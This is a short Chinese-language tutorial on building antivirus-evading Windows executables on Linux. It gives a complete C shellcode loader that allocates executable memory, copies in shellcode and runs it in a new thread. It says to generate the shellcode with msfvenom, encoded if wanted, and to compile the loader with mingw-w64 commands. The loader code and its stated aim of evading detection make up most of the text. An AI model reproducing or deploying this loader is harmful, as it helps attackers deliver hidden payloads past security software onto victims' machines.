所谓交叉编译跨平台编译即在一个平台上编译另一个平台的可执行程序，这里使用在Linux上编译exe的方法进行免杀。



（一）准备一个模板，就是payload加载器用来加载shellcode：把shellcode当成一个函数去执行。
#include <stdio.h>
#include <windows.h>

unsigned char shellcode[] = ;

int main(void) {
    // 分配内存
    void* shellcodeMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcodeMemory) {
        printf("VirtualAlloc failed.\n");
        return 1;
    }

        // 将shellcode拷贝到分配的内存中
    RtlMoveMemory(shellcodeMemory, shellcode, sizeof(shellcode));

    // 创建线程以运行shellcode
    HANDLE threadHandle = CreateThread(
        NULL,                    // 默认安全属性
        0,                       // 默认堆栈大小
        (LPTHREAD_START_ROUTINE)shellcodeMemory, // 线程开始地址
        NULL,                    // 线程函数参数
        0,                       // 立即运行线程
        NULL                     // 线程ID（不需要）
    );

    if (!threadHandle) {
        printf("CreateThread failed.\n");
        VirtualFree(shellcodeMemory, 0, MEM_RELEASE);
        return 1;
    }

    // 等待线程完成
    WaitForSingleObject(threadHandle, INFINITE);

    // 清理
    CloseHandle(threadHandle);
    VirtualFree(shellcodeMemory, 0, MEM_RELEASE);

    return 0;
}



（二）使用msfvenom生成模板的shellcode字符串：
1 用-f c。

2 可以编码。



（三）使用mingw编译，方法和gcc一样。
1 Linux安装：sudo apt-get install mingw-w64
2 编译
编译64位程序：x86_64-w64-mingw32-gcc example.c -o example.exe
编译32位程序：i686-w64-mingw32-gcc -m32 example.c -o example.exe